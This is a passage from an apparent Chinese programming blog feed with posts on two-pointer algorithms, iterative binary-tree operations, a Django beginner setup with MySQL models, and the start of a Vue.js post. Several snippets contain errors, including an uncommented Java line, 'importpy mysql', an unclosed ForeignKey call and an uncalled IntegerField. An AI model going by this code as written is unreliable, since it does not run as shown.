  </entry>
  
  <entry>
    <title>双指针使用</title>
    <link href="https://www.doublekai.com/2021/06/28/%E5%8F%8C%E6%8C%87%E9%92%88%E4%BD%BF%E7%94%A8/"/>
    <id>https://www.doublekai.com/2021/06/28/%E5%8F%8C%E6%8C%87%E9%92%88%E4%BD%BF%E7%94%A8/</id>
    <published>2021-06-28T02:07:06.000Z</published>
    <updated>2021-07-05T06:34:36.427Z</updated>
    
    <content type="html"><![CDATA[<p>先来看一个简单的题目<br>编写一个函数，其作用是将输入的字符串反转过来。输入字符串以字符数组 char[] 的形式给出。</p><p>不要给另外的数组分配额外的空间，你必须原地修改输入数组、使用 O(1) 的额外空间解决这一问题。</p><p>你可以假设数组中的所有字符都是 ASCII 码表中的可打印字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public void reverseString(char[] s) &#123;</span><br><span class="line">     /*</span><br><span class="line">        定义两个指针一个指向头一个指向尾部</span><br><span class="line">        两指针同时移动，将值交换。直到两指针重合或头大于尾则退出循环</span><br><span class="line">        */</span><br><span class="line">        int head=0,tail=s.length-1; //定义两个指针头、尾</span><br><span class="line">        while (head&lt;=tail)&#123;      //循环退出条件</span><br><span class="line">            if(s[head] == s[tail])&#123;  //如果相等则少一次交换</span><br><span class="line">                head++;tail--;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            char temp=s[head];  //交换头尾值</span><br><span class="line">            s[head++]=s[tail];</span><br><span class="line">            s[tail--]=temp;</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来看一个双指针应用如果链表中有某个节点，可以通过连续跟踪 next 指针再次到达，则链表中存在环。 为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。注意：pos 不作为参数进行传递，仅仅是为了标识链表的实际情况。<br>如果链表中存在环，则返回 true 。 否则，返回 false 。如下图则True有环<br><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist.png"><br>而下面的则为False<br><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test3.png" alt="代表"><br>方法一：直接将所有节点放在HashSet存储结构中遍历节点当该节点在表中存在则为True。<br>方法二：双指针利用快慢指针的思想，慢指针走得慢，快指针比慢指针快两倍，当快指针和慢指针相遇的时候则必有环为True代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public class Solution &#123;</span><br><span class="line">    public boolean hasCycle(ListNode head) &#123;</span><br><span class="line">        if (head == null ||head.next == null)&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode after=head; //慢指针</span><br><span class="line">        ListNode front=head.next;  //快指针</span><br><span class="line">        while (after!=front)&#123;    //当快指针跟慢指针重合则跳出循环 返回True</span><br><span class="line">            if (front == null ||front.next == null)&#123;   //如果快指针为空，说明不是环</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">            front=front.next.next;   //快指针移动要比慢指针快一步</span><br><span class="line">            after=after.next;    慢指针正常移动</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>双指针实现奇偶数排序<br>给定一个非负整数数组A， A 中一半整数是奇数，一半整数是偶数。<br>对数组进行排序，以便当A[i] 为奇数时，i也是奇数；当A[i]为偶数时， i 也是偶数。<br>分析：<br>方法一：重新定义一个数组B，遍历A当A[i]为奇数时放入奇数下标中j=1,j+=2,B[j]=A[i]，同理再次遍历A，将偶数放入B中<br>可以看出来时间复杂度为O（n），使用新的空间；<br>方法二：利用双指针<br>1.定义两个指针分别指向偶数下标和奇数下标<br>2.当偶数下标不是偶数时移动奇数下标指针当找到奇数下标不是奇数两个就可以交换<br>可能有点绕口接下来看A=[1,3,0,4] 当A[0]不是偶数时必定存在一个A[j]（j为奇数）不是奇数这里面也就是A[3],所以A[0]&lt;=&gt;A[3]交换则可以。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public int[] sortArrayByParityII(int[] nums) &#123;</span><br><span class="line">        /*</span><br><span class="line">        给定一个非负整数数组A， A 中一半整数是奇数，一半整数是偶数。</span><br><span class="line"></span><br><span class="line">        对数组进行排序，以便当A[i] 为奇数时，i也是奇数；当A[i]为偶数时， i 也是偶数。</span><br><span class="line"></span><br><span class="line">        你可以返回任何满足上述条件的数组作为答案。</span><br><span class="line">        1.定义两个指针分别指向偶数下标和奇数下标</span><br><span class="line">        2.当偶数下标不是偶数时移动奇数下标指针当找到奇数下标不是奇数两个就可以交换</span><br><span class="line">        */</span><br><span class="line">        int odd=1;//奇数指针</span><br><span class="line">        int enev=0;//偶数下标</span><br><span class="line">        while (enev&lt; nums.length)&#123;</span><br><span class="line">            if(nums[enev]%2!=0)&#123;   //如果偶数下标是奇数的话，则找到奇数下标是偶数的交换则可以</span><br><span class="line">                while (nums[odd]%2!=0)&#123;  // 找到奇数下标为偶数的值</span><br><span class="line">                    odd+=2;</span><br><span class="line">                    &#125;</span><br><span class="line">                int temp=nums[odd];   //交换</span><br><span class="line">                nums[odd]=nums[enev];</span><br><span class="line">                nums[enev]=temp;</span><br><span class="line">            &#125;</span><br><span class="line">            enev+=2;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return nums;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在使用指针的过程中，要明白指针真正的含义，指针指向的不是值，而是值所待的地方也就是内存，当你明白这个道理那指针应用就会变得很简单，家都归你了何况家里的物品。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;先来看一个简单的题目&lt;br&gt;编写一个函数，其作用是将输入的字符串反转过来。输入字符串以字符数组 char[] 的形式给出。&lt;/p&gt;
&lt;p&gt;不要给另外的数组分配额外的空间，你必须原地修改输入数组、使用 O(1) 的额外空间解决这一问题。&lt;/p&gt;
&lt;p&gt;你可以假设数组中的所有字</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>二叉树的操作（非递归）</title>
    <link href="https://www.doublekai.com/2021/06/22/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%93%8D%E4%BD%9C/"/>
    <id>https://www.doublekai.com/2021/06/22/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%93%8D%E4%BD%9C/</id>
    <published>2021-06-22T08:47:22.000Z</published>
    <updated>2021-06-28T02:07:39.336Z</updated>
    
    <content type="html"><![CDATA[<h3 id="判断是否是对称二叉树"><a href="#判断是否是对称二叉树" class="headerlink" title="判断是否是对称二叉树"></a>判断是否是对称二叉树</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">def isSymmetric(self, root: TreeNode) -&gt; bool:</span><br><span class="line">    if not root:</span><br><span class="line">        return False</span><br><span class="line">    queue = [(root.left, root.right)]# 初始化队列</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    1.空节点返回False</span><br><span class="line">    2.根结点的左等于根结点的右</span><br><span class="line">    3.如果有一个为空则返回False</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    while queue:</span><br><span class="line">        rt1, rt2 = queue.pop()</span><br><span class="line">        if not rt1 and not rt2: #如果都为空则跳过</span><br><span class="line">            continue</span><br><span class="line">        if rt1.val != rt2.val:  #如果不相等 则返回False</span><br><span class="line">            return False</span><br><span class="line">        if not rt1.left and rt2.right:  # 如果左右有一个为空</span><br><span class="line">            return False</span><br><span class="line">        if not rt1.right and rt2.left: #同理</span><br><span class="line">            return False</span><br><span class="line">        queue.append((rt1.left, rt2.right)) #将左树的左节点跟右树的右节点入队</span><br><span class="line">        queue.append((rt1.right, rt2.left)) #同理 将左树的右节点和右树的左节点入队</span><br><span class="line">    return True</span><br></pre></td></tr></table></figure><h3 id="二叉树合并"><a href="#二叉树合并" class="headerlink" title="二叉树合并"></a>二叉树合并</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">def mergeTrees(self, root1: TreeNode, root2: TreeNode) -&gt; TreeNode:</span><br><span class="line">    if not root1 or not root2 :</span><br><span class="line">        return  root1 if not root1 else root2  # 如果根结点有一个为空直接返回</span><br><span class="line"></span><br><span class="line">    quese = [(root1, root2)]  #quese=[(1,2)]</span><br><span class="line">    while quese:</span><br><span class="line">        root1, root2 = quese.pop() # root1=1</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">       1.当树a为空 树b也不为空 树a=树a+树b</span><br><span class="line">       2.当树a的左孩子为空,树b的左孩子不为空 树a=树b</span><br><span class="line">        同理。。。</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">        if root1 and root2:</span><br><span class="line">            root1.val += root2.val   #root1.val=1+2</span><br><span class="line">        #右孩子 只判断树b的右孩子不为空的情况</span><br><span class="line">        if root1.right and root2.right:</span><br><span class="line">            quese.append((root1.right, root2.right))</span><br><span class="line">        elif not root1.right and root2.right:</span><br><span class="line">            root1.right = root2.right</span><br><span class="line">        # elif root1.right and not root2.right:  # 不用判断</span><br><span class="line">        #     root1.right = root2.right</span><br><span class="line">       #左孩子 同理</span><br><span class="line">        if root1.left and root2.left:</span><br><span class="line">            quese.append((root1.left, root2.left))</span><br><span class="line">        elif not root1.left and root2.left:</span><br><span class="line">            root1.left = root2.left</span><br><span class="line">    return root1</span><br></pre></td></tr></table></figure><h3 id="二叉树的反转-跟判断二叉树对称的方法一样"><a href="#二叉树的反转-跟判断二叉树对称的方法一样" class="headerlink" title="二叉树的反转(跟判断二叉树对称的方法一样)"></a>二叉树的反转(跟判断二叉树对称的方法一样)</h3>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line"> def invertTree(self, root: TreeNode) -&gt; TreeNode:</span><br><span class="line">     if not root:</span><br><span class="line">         return None</span><br><span class="line">     queue=[(root.left,root.right)] # 左右孩子入队</span><br><span class="line">     while queue:</span><br><span class="line">         rt1,rt2=queue.pop(0)  #左右孩子出队</span><br><span class="line">         rt1.val,rt2.val = rt2.val,rt1.val # 交换节点的值</span><br><span class="line">         if rt1.left or rt1.right:  # 左右孩子都为空则不入队</span><br><span class="line">             queue.append((rt1.left,rt2.right))</span><br><span class="line">         if rt2.left or rt2.right:</span><br><span class="line">             queue.append((rt1.right,rt2.left)) #同理</span><br><span class="line">     return root</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>二叉树结构：把左右节点当作两个根结点的二叉树以此类推。很容易就想到递归。<br>这里用到迭代：把左右节点当作队列或者是栈，利用先进先出或先进后出的思想来完成相应的操作，以此类推每个子树都用这种思想，这样二叉树的一些操作就显得非常简单。</p><p><img src="http://qv8lp3wlj.bkt.gdipper.com/2.jpg" alt="测试图片">   </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;判断是否是对称二叉树&quot;&gt;&lt;a href=&quot;#判断是否是对称二叉树&quot; class=&quot;headerlink&quot; title=&quot;判断是否是对称二叉树&quot;&gt;&lt;/a&gt;判断是否是对称二叉树&lt;/h3&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;tabl</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Django入门</title>
    <link href="https://www.doublekai.com/2020/10/26/Django%E5%85%A5%E9%97%A8/"/>
    <id>https://www.doublekai.com/2020/10/26/Django%E5%85%A5%E9%97%A8/</id>
    <published>2020-10-26T09:32:59.000Z</published>
    <updated>2020-10-26T09:37:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Django入门笔记"><a href="#Django入门笔记" class="headerlink" title="Django入门笔记"></a>Django入门笔记</h1><h2 id="Django安装-python2-7"><a href="#Django安装-python2-7" class="headerlink" title="Django安装(python2.7)"></a>Django安装(python2.7)</h2><blockquote><p>版本对照<img src="https://github.com/doublekai/user/blob/master/django.png?raw=true" alt="image"></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip --default-timeout=100 install -i https://pypi.mirrors.ustc.edu.cn/simple/ django==1.8</span><br></pre></td></tr></table></figure><h2 id="创建第一个项目"><a href="#创建第一个项目" class="headerlink" title="创建第一个项目"></a>创建第一个项目</h2><blockquote><p>进入提前创建的文件夹</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">django-admin startproject HelloWorld</span><br><span class="line"></span><br><span class="line">cd HelloWorld/HelloWorld</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>创建xx.py文件</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from django.http import HttpResponse</span><br><span class="line">def hello(request):</span><br><span class="line">    return HttpResponse(&quot;Hello,world&quot;)</span><br></pre></td></tr></table></figure><blockquote><p>找到urls.py文件这个文件作用是保存路径和函数的对应关系，代码替换</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from django.conf.urls import  url</span><br><span class="line">from . import views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    # Examples:</span><br><span class="line">    # url(r&#x27;^$&#x27;, &#x27;HelloWord.views.home&#x27;, name=&#x27;home&#x27;),</span><br><span class="line">    # url(r&#x27;^blog/&#x27;, include(&#x27;blog.urls&#x27;)),</span><br><span class="line"></span><br><span class="line">    url(r&#x27;^&#x27;, views.hello),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><blockquote><p>在目录下使用命令,启动服务器自己设定端口</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py runserver  127.0.0.1:8000</span><br></pre></td></tr></table></figure><blockquote><p>接下来打开浏览器就能看到</p></blockquote><h2 id="创建MTV项目"><a href="#创建MTV项目" class="headerlink" title="创建MTV项目"></a>创建MTV项目</h2><p>M =model<br>T =view<br>V =controller</p><blockquote><p>同上代码创建项目，在本项目内创建子目录（也就是子功能）</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python manage.py startapp goods </span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>在目录下找到settings.py在INSTALLED_APPS中将刚才两个项目添加进去，运行命令（ip也可以不要）</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py runserver </span><br></pre></td></tr></table></figure><h2 id="启动mysql"><a href="#启动mysql" class="headerlink" title="启动mysql"></a>启动mysql</h2><blockquote><p>启动服务 输入密码</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net start mysql </span><br><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure><blockquote><p>我使用的是Navicat for MySQL<br>然后在Djang创建的目录下找到刚才与上面相同的配置文件找到DATABASES修改和添加配置</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x27;ENGINE&#x27;: &#x27;django.db.backends.mysql&#x27;,</span><br><span class="line">       #数据库的名字</span><br><span class="line">       &#x27;NAME&#x27;:&#x27;&#x27; ,</span><br><span class="line">       #数据库地址</span><br><span class="line">       &#x27;HOST&#x27;:&quot;localhost&quot;,</span><br><span class="line">       #端口</span><br><span class="line">       &#x27;PORT&#x27;:&#x27;3306&#x27;,</span><br><span class="line">       #用户名</span><br><span class="line">       &#x27;USER&#x27;:&#x27;root&#x27;,</span><br><span class="line">       #密码</span><br><span class="line">       &#x27;PASSWORD&#x27;:&#x27;root&#x27;,</span><br></pre></td></tr></table></figure><blockquote><p>在_init__.py中</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">importpy mysql</span><br><span class="line"># 因为本身Django不支持mysql语句</span><br><span class="line">pymysql.install_as_MySQLdb()</span><br></pre></td></tr></table></figure><blockquote><p>在项目中找到模型也就是models.py中创建数据库表以及字段</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from django.db import models</span><br><span class="line"></span><br><span class="line"># Create your models here.</span><br><span class="line">#商品分类表</span><br><span class="line">class GoodsCategory(models.Model):</span><br><span class="line">    #分类的名称 如果类型是字符串类型 max_length必须要</span><br><span class="line">    cat_name=models.CharField(max_length=30)</span><br><span class="line">    #分类的样式</span><br><span class="line">    cat_css = models.CharField(max_length=20)</span><br><span class="line">    #分类的图片  图片路径</span><br><span class="line">    cat_img = models.ImageField(upload_to=&#x27;cag&#x27;)</span><br><span class="line">#商品表</span><br><span class="line">class GoodsInfo(models.Model):</span><br><span class="line">    #商品名字</span><br><span class="line">    goods_name = models.CharField(max_length=100)</span><br><span class="line">    #商品价格 default 默认为0</span><br><span class="line">    goods_price=models.IntegerField(default=0)</span><br><span class="line">    #商品描述</span><br><span class="line">    goods_desc=models.CharField(max_length=2000)</span><br><span class="line">    #商品图片</span><br><span class="line">    goods_img=models.ImageField(upload_to=&#x27;goods&#x27;)</span><br><span class="line">    #商品分类   定义外键</span><br><span class="line">    goods_cag=models.ForeignKey(&#x27;GoodsCategory&#x27;)</span><br><span class="line"></span><br><span class="line">from django.db import models</span><br><span class="line">class OrderInfo(models.Model):</span><br><span class="line">    status=(</span><br><span class="line">        (1,&#x27;待付款&#x27;),</span><br><span class="line">        (2, &#x27;待发货&#x27;),</span><br><span class="line">        (3, &#x27;待收货&#x27;),</span><br><span class="line">        (4, &#x27;已完成&#x27;),</span><br><span class="line">    )</span><br><span class="line">    #订单编号</span><br><span class="line">    order_id =models.CharField(max_length=100)</span><br><span class="line">    #收货地址</span><br><span class="line">    order_address=models.CharField(max_length=100)</span><br><span class="line">    #收货人</span><br><span class="line">    order_recv=models.CharField(max_length=50)</span><br><span class="line">    #联系电话</span><br><span class="line">    order_phone=models.CharField(max_length=11)</span><br><span class="line">    #运费</span><br><span class="line">    order_fee=models.IntegerField(default=10)</span><br><span class="line">    #订单状态</span><br><span class="line">    order_status=models.IntegerField(default=1,choices=status)</span><br><span class="line"></span><br><span class="line">    #订单备注</span><br><span class="line">    order_extra=models.CharField(max_length=200)</span><br><span class="line">#订单商品表</span><br><span class="line">class OrderGoods(models.Model):</span><br><span class="line">    #所属商品 链接外键</span><br><span class="line">    goods_info=models.ForeignKey(&#x27;goods.GoodsInfo&#x27;)</span><br><span class="line">    #商品数量</span><br><span class="line">    goods_num=models.IntegerField</span><br><span class="line">    #商品所属订单  链接外键</span><br><span class="line">    goods_order=models.ForeignKey(&#x27;OrderInfo&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>执行语句 第一句会生成两个文件 两个文件就是创建sql语句 也可以用命令查看 第二句是执行sql语句 这时候会在数据库中看到我们创建的表</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python manage.py makemigrations</span><br><span class="line">python manage.py migrate</span><br></pre></td></tr></table></figure><h2 id="创建视图"><a href="#创建视图" class="headerlink" title="创建视图"></a>创建视图</h2><blockquote><p>1.需要创建我们的templates也就是前端页面</p></blockquote><blockquote><p>2.在settings中TEMPLATES列表中’DIRS’: [os.path.join(BASE_DIR,’templates’)],添加我们的路径</p></blockquote><blockquote><p>3.在views中使用render函数返回页面</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return render(request,&#x27;index.html&#x27;)</span><br></pre></td></tr></table></figure><h2 id="模板传值"><a href="#模板传值" class="headerlink" title="模板传值"></a>模板传值</h2><blockquote><p>使用render方法</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return render(request,&#x27;index.html&#x27;,&#123;&#x27;name&#x27;:&#x27;张三&#x27;,&#x27;age&#x27;:19&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>在index使用显示</p></blockquote><h2 id="静态显示"><a href="#静态显示" class="headerlink" title="静态显示"></a>静态显示</h2><blockquote><p>新建静态文件夹 在配置文件中添加静态文件的路径</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">STATICFILES_DIRS=[os.path.join(BASE_DIR,&#x27;static&#x27;)]</span><br></pre></td></tr></table></figure><h2 id="创建主页"><a href="#创建主页" class="headerlink" title="创建主页"></a>创建主页</h2><blockquote><p>最后简单的预览<br><img src="https://github.com/doublekai/user/blob/master/1.png?raw=true" alt="image"></p></blockquote><h4 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h4><p><a href="https://github.com/doublekai/user/">点击找到Pthoto</a></p><h4 id="GitHub上传"><a href="#GitHub上传" class="headerlink" title="GitHub上传"></a>GitHub上传</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo new post Django入门 </span><br><span class="line"></span><br><span class="line">hexo g -d</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Django入门笔记&quot;&gt;&lt;a href=&quot;#Django入门笔记&quot; class=&quot;headerlink&quot; title=&quot;Django入门笔记&quot;&gt;&lt;/a&gt;Django入门笔记&lt;/h1&gt;&lt;h2 id=&quot;Django安装-python2-7&quot;&gt;&lt;a href=&quot;#Dja</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Vue.js基础指令和使用</title>
    <link href="https://www.doublekai.com/2019/04/16/Vue.js%E5%9F%BA%E7%A1%80%E6%8C%87%E4%BB%A4%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
    <id>https://www.doublekai.com/2019/04/16/Vue.js%E5%9F%BA%E7%A1%80%E6%8C%87%E4%BB%A4%E5%92%8C%E4%BD%BF%E7%94%A8/</id>
    <published>2019-04-16T10:59:42.000Z</published>
    <updated>2019-04-16T11:21:24.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Vue的来源"><a href="#Vue的来源" class="headerlink" title="Vue的来源"></a>Vue的来源</h2><p>Vue  是一套用于构建用户界面的渐进式框架。与其它大型框架不同的是，Vue 被设计为可以自底向上逐层应用。Vue 的核心库只关注视图层，不仅易于上手，还便于与第三方库或既有项目整合。另一方面，当与现代化的工具链以及各种支持类库结合使用时，Vue 也完全能够为复杂的单页应用提供驱动。 </p><h2 id="Vue和jQuery"><a href="#Vue和jQuery" class="headerlink" title="Vue和jQuery"></a>Vue和jQuery</h2><blockquote><p>   如果你使用过JQuery那你对Vue一定爱不释手，jQuery是js的库，而库就是仓库，用来管理我们常用的js调用方法,jQuery的优点就是寻找DOM快，操作DOM灵活。而Vue是js的一种框架。如果你知道怎么使用jQuery那就一定会使用Vue。(最后提醒一下:建议先用原生js实现DOM的操作不要直接接触jQuery和Vue)</p></blockquote><hr><h2 id="Vue的在线使用-当然也可以下载到本地调用"><a href="#Vue的在线使用-当然也可以下载到本地调用" class="headerlink" title="Vue的在线使用(当然也可以下载到本地调用)"></a>Vue的在线使用(当然也可以下载到本地调用)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;&gt;&lt;/script&gt; </span><br></pre></td></tr></table></figure><h3 id="直接贴代码"><a href="#直接贴代码" class="headerlink" title="直接贴代码"></a>直接贴代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 